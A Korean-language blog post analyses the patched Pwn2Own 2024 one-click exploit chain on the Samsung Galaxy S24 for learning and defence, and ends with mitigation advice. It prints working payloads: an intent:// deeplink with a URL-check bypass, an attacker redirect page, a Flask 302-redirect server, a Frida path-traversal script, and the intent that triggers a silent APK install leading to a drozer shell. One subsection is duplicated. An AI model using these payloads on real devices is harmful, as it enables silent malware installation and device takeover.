+++
date = '2026-03-01T16:56:12+09:00'
draft = false
title = '[Review] Samsung Galaxy S24 - (Pwn2Own Ireland 2024) White Paper 분석'
summary = "Pwn2Own Ireland 2024에서 공개되고, OffensiveCon 2025의 'Chainspotting 2' 발표에서 다뤄진 삼성 갤럭시 S24의 1-Click 익스플로잇 체인을 분석"
toc = true
tags = ["Samsung", "Galaxy S24", "Pwn2Own", "WebView", "Intent Redirection", "Deeplink", "Path Traversal"]
+++

---

## 들어가며
우리는 일상적으로 삼성 갤럭시 스마트폰을 사용하며 게이밍 허브, 퀵 쉐어, 스마트 스위치와 같은 기본 탑재 앱들이 제공하는 편리한 생태계를 누린다.

최신 안드로이드 OS는 앱 간의 권한을 엄격하게 분리하는 강력한 샌드박스(Sandbox) 보안 모델을 적용하고 있어, 하나의 앱이 취약하더라도 시스템 전체가 장악되는 것을 방어한다.  
하지만 이러한 환경에서도 서로 다른 여러 앱의 설정 실수와 사소해 보이는 취약점들, 그리고 '정상적인 기능'들이 교묘하게 엮인다면 개발자의 의도를 벗어나 치명적인 결과로 이어질 수 있다.

이번 글에서는 Pwn2Own Ireland 2024에서 공개되고, OffensiveCon 2025의 "Chainspotting 2" 발표에서 다뤄진 삼성 갤럭시 S24의 1-Click 익스플로잇 체인을 분석한다.

이 공격의 핵심은 단순히 웹뷰에서 악성 스크립트가 실행되는 것에 그치지 않는다.  
단 한 번의 잘못된 링크 클릭(1-Click)으로 게이밍 허브 앱이 장악되고, 퀵 쉐어의 정상 기능을 통해 사용자 몰래 악성 파일이 다운로드되며, 최종적으로 스마트 스위치를 통해 기기에 악성 앱이 어떠한 사용자 승인도 없이 조용히 무단 설치되고 기기 제어권이 완전히 탈취되는 구체적인 파이프라인을 보여준다.

특히, 복잡한 OS 레벨의 메모리 오염이나 0-Day 취약점이 아닌, 기본적인 안드로이드 컴포넌트 권한 설정과 Intent Schema의 검증 누락 등 총 5개의 버그와 1개의 정상 기능이 어떻게 하나의 거대한 익스플로잇 체인을 형성하는지 중점적으로 다룰 것이다.

본격적인 PoC 분석에 앞서 모바일 보안이나 안드로이드 구조에 익숙하지 않은 독자라면 [[Review] KakaoTalk 1-Click Exploit 분석 (CVE-2023-51219)](https://kmingon.github.io/review/review-kakaotalk-1-click-exploit-%EB%B6%84%EC%84%9D-cve-2023-51219/) 글 초반부에서 공격의 전체 흐름을 명확히 이해할 수 있도록 필수 배경지식인 안드로이드 앱 보안과 웹 네트워크의 핵심 개념을 설명하고 있으니 참고하길 바란다.

---

## POC.1 Gaming Hub Webview 장악 및 임의 앱 실행

공격의 첫 Entry Point는 삼성의 기본 탑재 앱인 Gaming Hub (버전 7.1.01.7 이하)이다.

공격자는 피해자가 특정 하이퍼링크를 탭하도록 유도하여 게이밍 허브의 웹뷰를 열고 악성 스크립트를 실행한다.

### URL 검증 우회 및 악성 스크립트 실행

공격자가 구성한 1-Click 페이로드 하이퍼링크의 구조는 다음과 같다.  
피해자가 이 링크를 클릭하게 유도하는 것이 공격의 시작이다.

```html
<html>
    <body>
        <h1>
        <a href="intent://com.samsung.android.game.gamehome/gmp?url=https://us.mcsvc.samsung.com.<redacted>.com?yayattackeryay=<attackerServer>#Intent;scheme=gamelauncher;end">yaypocyay</a>
        </h1>
    </body>
</html>
```

링크를 클릭하면 게이밍 허브의 `MainActivity`가 실행되며, 전달된 Intent의 첫 번째 경로가 `gmp`인 것을 확인한 뒤 `url` 파라미터 값을 추출해 `GmpWebActivity`로 넘긴다.  
이 값은 최종적으로 웹뷰에 로드될 대상 URL이 된다.

앱은 안전한 URL만 로드하기 위해 `F(String)` 이라는 검증 메서드를 거친다.  
정상적인 로직이라면 삼성이 소유한 도메인만 허용해야 하지만, 여기서 첫 번째 취약점(CVE-2024-49419)이 발생한다.  
해당 검증 로직은 입력된 URL이 `https://us.mcsvc.samsung.com` 과 같은 특정 화이트리스트 문자열로 시작하는지만 검사할 뿐, 도메인이 끝나는 지점에 대한 검증이 누락되어 있었다.  
따라서 공격자가 `https://us.mcsvc.samsung.com.<redacted>.com` 과 같이 조작된 도메인을 넘겨도 검증 로직을 통과하게 된다.

검증을 통과하면 앱은 `setJavaScriptEnabled(true)`를 호출하여Webview 내의 자바스크립트 실행을 허용한다.

더욱 치명적인 것은 두 번째 취약점(CVE-2024-49418)이다.  
게이밍 허브의 웹뷰는 앞선 `F(String)` 검증이 단순히 자바스크립트를 활성화/비활성화하는 용도로만 쓰일 뿐, 검증 실패 여부와 무관하게 무조건 `loadUrl()`을 실행해버린다.

결국 공격자의 웹 페이지가 자바스크립트가 활성화된 상태로 게이밍 허브 앱 내부에서 그대로 렌더링된다.

이때 공격자의 서버(`us.mcsvc.samsung.com.<redacted>.com`)에 호스팅된 `index.html` 페이로드는 다음과 같이 구성되어, 이후 단계를 위한 타이머를 작동시킨다.

```html
yaytrampolineyay
<script>
 // get hostname and port
var yayquerystringyay = window.location.search;
var yayurlparamsyay = new URLSearchParams(yayquerystringyay);
var yayattackeryay = yayurlparamsyay.get('yayattackeryay');

 // open sharelive to start awareservice
location.href="http://" + yayattackeryay + "/yaylaunchshareliveyay";

 // redirect after 2 seconds
const yayshorttimeoutyay = setTimeout(yaystartyay, 2000);

 // open sharelive and retrieve file
function yaystartyay() {
        location.href="http://" + yayattackeryay + "/yayshareliveyay";
}

 // redirect after 15 seconds
const yaytimeoutyay = setTimeout(yayfinalyay, 15000);

 // redirect to launch easymover agent
function yayfinalyay() {
        location.href="http://" + yayattackeryay + "/yayfinalyay";
        
        // redirect after another 15 seconds
        const yaytimeout2yay = setTimeout(yaylaunchyay, 15000);
}

 // launch drozer
function yaylaunchyay() {
        location.href="http://" + yayattackeryay + "/yaylaunchyay";
}

</script>
```

### Intent Redirection을 통한 임의 Activity 실행

게이밍 허브의 웹뷰 내부에서 공격자의 자바스크립트가 실행될 수 있게 되었다.  
이제 공격자는 기기 내의 다른 앱들을 강제 실행하기 위해 세 번째 취약점(CVE-2024-49420)을 트리거한다.

게이밍 허브 웹뷰에는 `shouldOverrideUrlLoading` 메서드가 오버라이딩 되어있는데, 이 메서드는 웹 서버가 `302 Redirect` 응답을 보낼 때 리다이렉션 될 URL을 분석한다.

만약 리다이렉트 되는 URL의 스킴이 `intent://` 라면, 앱은 이를 `GmpWebActivity` 의 메서드로 넘기고, 안드로이드 내부의 Intent 파서(`Intent.parseUri`)로 전달하여 곧바로 `startActivity(Intent)`를 실행한다.

이를 이용하여 공격자는 자신의 서버에 다음과 같은 Python Flask 서버(`yay.py`)를 구동하여, 게이밍 허브 웹뷰가 요청을 보낼 때마다 `intent://` 스킴을 302 응답으로 내려보낸다.

```python
from flask import Flask, redirect, url_for, send_from_directory

app = Flask(__name__)

# Route for serving index.html
@app.route('/')
def index():
    return send_from_directory('', 'index.html')

# redirect to open com.sec.android.easyMover.Agent
@app.route('/yayfinalyay')
def yayfinalyay():
    return redirect("intent://#Intent;component=com.sec.android.easyMover.Agent/.ui.SsmUpdateCheckActivity;action=com.sec.android.easyMover.Agent.WATCH_INSTALL_SMART_SWITCH;S.MODE=DIALOG;S.ssm_action=yayactionyay;S.ssm_uri=%63%6f%6e%74%65%6e%74%3a%2f%2f%63%6f%6d%2e%73%61%6d%73%75%6e%67%2e%67%70%75%77%61%74%63%68%61%70%70%2e%48%74%6d%6c%44%75%6d%70%50%72%6f%76%69%64%65%72%2f%79%61%79%2e%61%70%6b;end;", code=302)

# launch sharelive to stare aware service
@app.route('/yaylaunchshareliveyay')
def yaylaunchshareliveyay():
    return redirect("intent://#Intent;component=com.samsung.android.app.sharelive/.presentation.main.MainActivity;end;", code=302)

# sharelive to download yay.apk to arbitrary location
@app.route('/yayshareliveyay')
def yayshareliveyay():
    yayqrcodeyay = "88AKqZwy2Hmr"
    return redirect("intent://qr.quickshare.samsungcloud.com/" + yayqrcodeyay + "#Intent;component=com.samsung.android.app.sharelive/com.samsung.android.app.sharelive.presentation.applink.QrCodeAppLinkActivity;scheme=https;end;", code=302)

# launch drozer
@app.route('/yaylaunchyay')
def yaylaunchyay():
    return redirect("intent://#Intent;component=com.yaydevhackmodyay.drozer/com.mwr.dz.activities.MainActivity;end;", code=302)

# pichu dancing
@app.route('/pichu-dance.gif')
def pichuDance():
    return send_from_directory('', 'pichu-dance.gif')

if __name__ == '__main__':
    context = ('cert.pem', 'key.pem')
    app.run(debug=True, port=8000, host="0.0.0.0")
```

자바스크립트가 `/yaylaunchshareliveyay` 로 요청을 보내면 공격자의 서버는 아래와 같은 `intent://` 스킴을 반환한다.

```jsx
intent://#Intent;component=com.samsung.android.app.sharelive/.presentation.main.MainActivity;end;
```

게이밍 허브 웹뷰는 이 302 리다이렉트 응답을 그대로 받아들여 안드로이드 Intent로 파싱하고 실행해버린다.

이 취약점을 통해 공격자는 게이밍 허브의 권한을 이용해 안드로이드 기기 내에 Exported된 임의의 모든 Activity를 마음대로 호출할 수 있게 되었다.

이제 해당 권한을 바탕으로 다음 타겟인 Quick Share 앱을 공격한다.

---

## PoC.2 Quick Share 기능 악용 및 Path Traversal

안드로이드 정책상 일반적인 Activity는 포그라운드에 있어야만 다른 Activity를 실행할 수 있다.
하지만 게이밍 허브는 앱 실행 시 포그라운드 서비스를 시작하며 `android.permission.FOREGROUND_SERVICE` 권한을 가지고 있기 때문에, 백그라운드에서도 다른 Activity들을 실행할 수 있는 상태를 유지한다.

### QR 링크를 통한 파일 자동 다운로드

공격자는 이 권한을 활용해 Quick Share의 `MainActivity`를 실행하여 퀵 쉐어 관련 서비스가 백그라운드에 준비되도록 만든 뒤, 아래와 같은 딥링크 페이로드를 전달하여 퀵 쉐어의 `QrCodeAppLinkActivity`를 강제로 실행시킨다.

```jsx
intent://qr.quickshare.samsungcloud.com/<shareCode>#Intent;component=com.samsung.android.app.sharelive/com.samsung.android.app.sharelive.presentation.applink.QrCodeAppLinkActivity;scheme=https;end;
```

여기서 `<shareCode>`는 공격자가 자신의 기기에서 악성 APK 파일(`yay.apk`)을 퀵 쉐어로 공유할 때 생성된 QR 코드의 고유 식별자이다.

이때 Quick Share의 정상 기능도 공격에 악용된다.
Quick Share는 위와 같은 QR 코드 URL과 함께 `QrCodeAppLinkActivity`가 실행되면, 사용자에게 어떠한 확인 절차도 묻지 않고 근처에 있는 공격자의 호스팅 기기에 자동으로 연결하여 파일을 다운로드해버린다.  
정상적인 과정이라면 이 파일은 `/storage/emulated/0/Download/Quick Share/` 경로에 저장되어야 한다.

### IsPrivateShare 파라미터 변조 및 Path Traversal

하지만 공격자는 이 파일이 기본 다운로드 폴더가 아닌, 시스템 내부의 특정 위치로 숨겨지길 원한다.
파일 전송을 실질적으로 담당하는 백그라운드 앱인 Quick Share Agent에는 이를 가능하게 하는 네 번째 취약점(CVE-2024-49421, Path Traversal)이 존재한다.

파일을 전송할 때 공격자 측 퀵 쉐어 에이전트는 피해자에게 두 개의 JSON 메시지를 보낸다.
첫 번째는 연결 정보(`IsPrivateShare` 등), 두 번째는 파일 정보(`Name`, `Path` 등)를 담고 있다.
수신 측 퀵 쉐어 에이전트는 `IsPrivateShare` 값이 `true`일 경우(삼성이 제공하는 프라이빗 공유 기능), 전달받은 `Name`과 `Path`에 대해 경로 조작 문자를 검증하지 않는 결함이 있었다.

공격자는 자신의 폰에서 아래와 같은 Frida 스크립트(`yayscriptyay.js`)를 실행하여 송신되는 JSON 데이터를 가로채고 조작한다.

```jsx
console.log("script loaded"); 
Java.perform(function() {      
    var yayclass1yay = Java.use('e2.t');      
    yayclass1yay.n.overload('org.json.JSONObject', 'e2.h', 'boolean').implementation = function(a,b,c) {          
        if (a.has("IsPrivateShare")) {             
            a.put("IsPrivateShare", true) // 필터링 우회를 위해 true로 변조
        }         
        if (a.has("Path")) {             
            a.put("Path","/../../../../../../GPUWatch_Dump/html/") // Path Traversal 공격
        }         
        var ret_val = this.n(a,b,c);         
        console.log("send json: " + a + "\n" + "send bytes: " + ret_val + "\n")         
        return ret_val;     
    } 
});
```

이 스크립트를 통해 `IsPrivateShare`가 `true`로 변조되어 피해자 폰의 필터링 로직이 무력화되고, 변조된 `Path` 값(`../../../../../../GPUWatch_Dump/html/`)이 그대로 적용된다.  
그 결과, 악성 앱인 `yay.apk`는 기본 다운로드 폴더를 벗어나 공격자가 설정한 `/storage/emulated/0/GPUWatch_Dump/html/` 이라는 경로에 사용자 몰래 다운로드된다.

---

## PoC.3 Smart Switch를 통한 악성 앱 무단 설치

이제 피해자의 기기 내부에 악성 앱 파일이 다운로드되었지만, 아직 설치되지는 않았다.  
이를 강제로 설치하기 위해 공격자는 기기 간 데이터 마이그레이션을 돕는 Smart Switch Agent 앱을 이용한다.

### 권한 유지 및 Content Provider를 통한 파일 접근

공격자는 다시 게이밍 허브의 백그라운드 권한을 이용해 스마트 스위치 에이전트의 `SsmUpdateCheckActivity`를 호출하는 아래의 딥링크 페이로드를 전송한다.

```jsx
intent://#Intent;component=com.sec.android.easyMover.Agent/.ui.SsmUpdateCheckActivity;action=com.sec.android.easyMover.Agent.WATCH_INSTALL_SMART_SWITCH;S.MODE=DIALOG;S.ssm_action=yayactionyay;S.ssm_uri=%63%6f%6e%74%65%6e%74%3a%2f%2f%63%6f%6d%2e%73%61%6d%73%75%6e%67%2e%67%70%75%77%61%74%63%68%61%70%70%2e%48%74%6d%6c%44%75%6d%70%50%72%6f%76%69%64%65%72%2f%79%61%79%2e%61%70%6b;end;
```

### 권한 유지 및 Content Provider를 통한 파일 접근

공격자는 다시 게이밍 허브의 백그라운드 권한을 이용해 Smart Switch Agent의 `SsmUpdateCheckActivity`를 호출하는 아래의 딥링크 페이로드를 전송한다.

```java
intent://#Intent;component=com.sec.android.easyMover.Agent/.ui.SsmUpdateCheckActivity;action=com.sec.android.easyMover.Agent.WATCH_INSTALL_SMART_SWITCH;S.MODE=DIALOG;S.ssm_action=yayactionyay;S.ssm_uri=%63%6f%6e%74%65%6e%74%3a%2f%2f%63%6f%6d%2e%73%61%6d%73%75%6e%67%2e%67%70%75%77%61%74%63%68%61%70%70%2e%48%74%6d%6c%44%75%6d%70%50%72%6f%76%69%64%65%72%2f%79%61%79%2e%61%70%6b;end;
```

본래 이 Activity는 `com.wssnps.permission.COM_WSSNPS` 라는 커스텀 권한으로 보호되어 있어 외부에서 함부로 호출할 수 없지만, 게이밍 허브 앱 역시 Manifest 파일에 해당 권한을 가지고 있었기 때문에 호출이 가능했다.

Smart Switch Agent는 전달받은 Intent에서 `ssm_uri` 파라미터 값을 추출하여 해당 URI에 위치한 APK 파일을 복사하고 설치를 시도한다.
이때 한 가지 문제가 발생한다.  
Smart Switch Agent는 앞서 악성 파일이 위치한 `/storage/emulated/0/` 경로에 접근할 권한이 없었다.  
공격자는 이를 우회하기 위해 `ssm_uri`에 직접적인 파일 경로를 적는 대신, GPUWatch앱에 Exported 된 Content Provider를 악용한다.  
디코딩된 `ssm_uri` 파라미터는 다음과 같다. 

```java
content://com.samsung.gpuwatchapp.HtmlDumpProvider/yay.apk.

```

이 Content Provider를 통해 Smart Switch Agent는 정상적인 접근 권한인 것처럼 위장하여 숨겨둔 `yay.apk` 파일을 성공적으로 읽어 들인다.

### 서명 검증 누락을 이용한 Silent Install

파일을 읽어 들인 스마트 스위치 에이전트는 내부적으로 이를 `SmartSwitchMobile.apk` 라는 이름으로 복사한 뒤, 곧바로 설치 프로세스에 돌입한다.
여기서 이 익스플로잇 체인의 마지막 다섯 번째 취약점(CVE-2024-49413)이 사용된다.

앱 이름이 `SmartSwitchMobile.apk` 이라면, 이 파일이 정말로 삼성이 공식적으로 서명한 정상적인 앱인지, 신뢰할 수 있는 출처에서 다운로드 된 것인지 검증하는 로직이 반드시 존재해야 한다.  
하지만 스마트 스위치 에이전트에는 그러한 서명 검증 절차가 존재하지 않았다.

그 결과, 아무런 경고나 사용자 승인 창 없이 공격자의 악성 앱이 백그라운드에서 조용히 기기에 설치되어 버린다.  
설치가 완료된 직후, 게이밍 허브의 마지막 페이로드(`/yaylaunchyay`)가 작동하여 설치된 악성 앱을 실행(`com.yaydevhackmodyay.drozer/com.mwr.dz.activities.MainActivity`)시킴으로써 공격자는 피해자 기기의 권한을 획득(Bind Shell 등)하고 최종적으로 기기 제어권 탈취에 성공하게 된다.

---

## 대응 방안

지금까지 살펴본 복합적인 익스플로잇 체인은 안드로이드 OS 커널의 제로데이(0-Day)나 메모리 오염과 같은 고도화된 취약점이 아닌, 각 애플리케이션 개발 단계에서의 검증 누락과 논리적 결함에서 기인했다.  
삼성은 2024년 12월 보안 업데이트를 통해 해당 취약점들을 패치했으나, 근본적인 방어를 위해서는 안드로이드 생태계 전반에 걸쳐 다음과 같은 아키텍처 관점의 보안이 요구된다.

### Intent Schema 및 URL 로드 검증 강화

WebView는 외부 입력을 직접적으로 처리하는 관문이므로 매우 철저한 검증이 수반되어야 한다.

첫째, 허용된 도메인을 검증할 때는 단순히 `startsWith()`와 같이 문자열의 시작 부분만 검사해서는 안 되며, 정규표현식이나 URL 파싱 모듈을 통해 도메인의 끝(TLD)과 경로가 정확히 일치하는지 확인해야 한다.

둘째, 웹 서버가 `302 Redirect` 응답을 통해 `intent://` 스킴을 반환할 때 이를 무비판적으로 `Intent.parseUri()`에 넘겨 실행해서는 안 된다.
WebView 내에서 Intent 스킴을 처리할 때는 외부에서 임의의 Component 나 브라우저 외부의 앱을 강제로 실행하지 못하도록 사전에 정의된 안전한 액티비티만 호출 가능하게끔 화이트리스트 기반의 검증 로직을 구현해야 한다.

### 외부 데이터 경로 검증 및 패키지 서명 확인

앱 간 통신(IPC)이나 클라이언트가 전달하는 데이터는 언제든 변조될 수 있다는 Zero Trust관점을 가져야 한다.

퀵 쉐어의 사례처럼 `IsPrivateShare`와 같은 특정 플래그 값이 True라고 해서 데이터의 무결성을 맹신하고 경로 조작 문자(`../`) 필터링을 건너뛰는 예외 처리를 두어서는 안 된다.  
모든 외부 입력 파일 경로는 예외 없이 엄격하게 검증되어야 한다.

또한, 스마트 스위치 에이전트와 같이 파일 설치와 같은 민감한 권한을 수행하는 앱은, 다운로드된 파일의 출처가 기기 내부(Content Provider 등)라 할지라도 설치 직전에 해당 APK 파일이 신뢰할 수 있는 개발자(예: 삼성)에 의해 정상적으로 서명되었는지 반드시 검증해야 한다.

---

## 마치며

본 글에서 분석한 삼성 갤럭시 S24의 1-Click 익스플로잇 체인은 안드로이드의 강력한 샌드박스 보안 모델이 적용되어 있더라도, 서로 다른 앱들의 사소한 실수 몇 가지가 어떻게 전체 시스템의 붕괴로 이어질 수 있는지를 여실히 보여준다.

공격자는 게이밍 허브의 URL 검증 누락을 시작으로, 퀵 쉐어의 자동 다운로드라는 정상적인 기능을 악용했으며, 경로 조작을 통해 파일을 숨기고, GPUWatch의 노출된 Content Provider를 브릿지 삼아, 최종적으로 서명 검증이 없는 스마트 스위치를 통해 악성 앱을 무단 설치해 냈다.

이 모든 과정이 사용자의 링크 클릭 단 한 번만으로, 어떠한 경고창도 없이 백그라운드에서 조용히 일어났다.

결국 안전한 모바일 환경을 구축한다는 것은, 각 앱이 가진 권한을 최소화하는 동시에 다른 앱이나 서버로부터 넘겨받은 데이터와 파라미터들이 정말로 인가된 정상 로직을 거친 것인지를 끊임없이 의심하고 검증하는 과정일 것이다.

이 글이 모바일 샌드박스 환경을 개발하는 엔지니어들과, 보이지 않는 정상 기능들 사이의 연결 고리를 찾아 공격 벡터를 엮어내는 보안 연구자들에게 직관적인 인사이트를 제공하는 단서가 되기를 바란다.

---

> 참고자료
> https://www.nccgroup.com/media/vodcuxpw/samsung-galaxy-s24-whitepaper.pdf  
> https://www.shielder.com/blog/2024/04/element-android-cve-2024-26131-cve-2024-26132-never-take-intents-from-strangers/  
> https://developer.android.com/privacy-and-security/risks/insecure-webview-native-bridges?hl=ko